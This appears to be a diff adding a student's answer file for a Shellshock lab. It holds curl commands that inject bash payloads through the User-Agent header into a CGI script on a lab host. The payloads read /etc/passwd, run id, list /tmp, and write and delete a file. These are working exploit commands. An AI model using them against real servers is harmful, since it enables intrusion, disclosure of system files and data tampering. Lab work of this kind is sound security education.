@@ -1,0 +1,14 @@
+3.A
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; /bin/cat /etc/passwd' http://10.9.0.80/cgi-bin/mycgi.cgi
+
+3.B
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; /bin/id' http://10.9.0.80/cgi-bin/mycgi.cgi
+
+3.C
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; /bin/ls /tmp' http://10.9.0.80/cgi-bin/mycgi.cgi
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; echo "Hello" > /tmp/mytmp' http://10.9.0.80/cgi-bin/mycgi.cgi
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; /bin/cat /tmp/mytmp' http://10.9.0.80/cgi-bin/mycgi.cgi
+
+3.D
+curl -A '() { echo "a";}; echo Content_type:text/plain; echo; rm /tmp/mytmp' http://10.9.0.80/cgi-bin/mycgi.cgi
+
